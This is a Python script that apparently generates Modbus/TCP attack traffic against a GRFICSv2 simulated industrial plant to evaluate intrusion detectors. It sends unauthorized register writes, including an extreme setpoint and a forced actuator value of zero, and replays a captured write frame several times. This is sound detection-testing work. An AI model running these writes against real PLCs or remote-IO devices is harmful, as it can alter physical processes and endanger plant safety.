"""
Attack generator for the GRFICSv2 plant, run from the sensor host.

The same two attack classes as the Python testbed (replay + command
injection), but against a real GRFICSv2 remote-IO device over Modbus/TCP, so
the detectors can be evaluated on realistic plant traffic.

Ground truth is by SOURCE IP: every frame from this host's attack address is
an attack; the plant's own PLC->IO and HMI->PLC traffic (other IPs) is benign.
The label_grfics step uses that, so no per-packet manifest is needed here.

  * injection - unauthorized FC16 writes this device never receives from its
    master: an extreme setpoint, and a write to an unused register address.
  * replay    - one legitimate-looking FC16 write captured, then re-sent
    verbatim (same transaction ID, same bytes) several times.

The plant's PLC rewrites the IO every control cycle, so these writes do not
leave the process in a changed state after the run.

Run ON the sensor (needs an IP on the plant network - see --setup):
    sudo ip addr add 192.168.95.50/24 dev eth1
    python3 tools/grfics_attack.py 192.168.95.11
"""

from __future__ import annotations

import socket
import struct
import sys
import time

PLC_PORT = 502
UNIT = 247                 # GRFICSv2 remote-IO unit id (seen in the capture)
ACTUATOR_ADDR = 1          # the register the PLC legitimately writes (FC16)
UNUSED_ADDR = 40           # a register the PLC never writes
PROTOCOL_ID = 0


def fc16(tid: int, address: int, values: list[int]) -> bytes:
    body = b"".join(struct.pack(">H", v) for v in values)
    pdu = struct.pack(">BHHB", 0x10, address, len(values), len(body)) + body
    return struct.pack(">HHHB", tid, PROTOCOL_ID, len(pdu) + 1, UNIT) + pdu


def send(sock: socket.socket, frame: bytes) -> None:
    sock.sendall(frame)
    try:
        sock.settimeout(1.0)
        sock.recv(256)
    except OSError:
        pass


def main() -> None:
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.95.11"

    # --- injection: unauthorized writes, spaced 0.5 s apart ---
    s = socket.create_connection((target, PLC_PORT))
    print(f"INJECTION from {s.getsockname()[0]} -> {target}", flush=True)
    for i, (addr, vals, why) in enumerate([
        (ACTUATOR_ADDR, [65000], "extreme setpoint"),
        (UNUSED_ADDR,   [1],     "write to unused register"),
        (ACTUATOR_ADDR, [0],     "force actuator to 0"),
        (UNUSED_ADDR,   [999],   "write to unused register"),
    ]):
        send(s, fc16(0x3000 + i, addr, vals))
        print(f"  injection: FC16 addr={addr} vals={vals} ({why})", flush=True)
        time.sleep(0.5)
    s.close()

    time.sleep(1.0)

    # --- replay: capture one well-formed write, re-send it verbatim ---
    s = socket.create_connection((target, PLC_PORT))
    print(f"REPLAY from {s.getsockname()[0]} -> {target}", flush=True)
    frame = fc16(0x4242, ACTUATOR_ADDR, [50])   # a plausible value
    send(s, frame)                               # seed (not itself a replay)
    for _ in range(8):
        time.sleep(0.4)
        send(s, frame)                           # same bytes, same tid = replay
    s.close()
    print("done", flush=True)


if __name__ == "__main__":
    main()
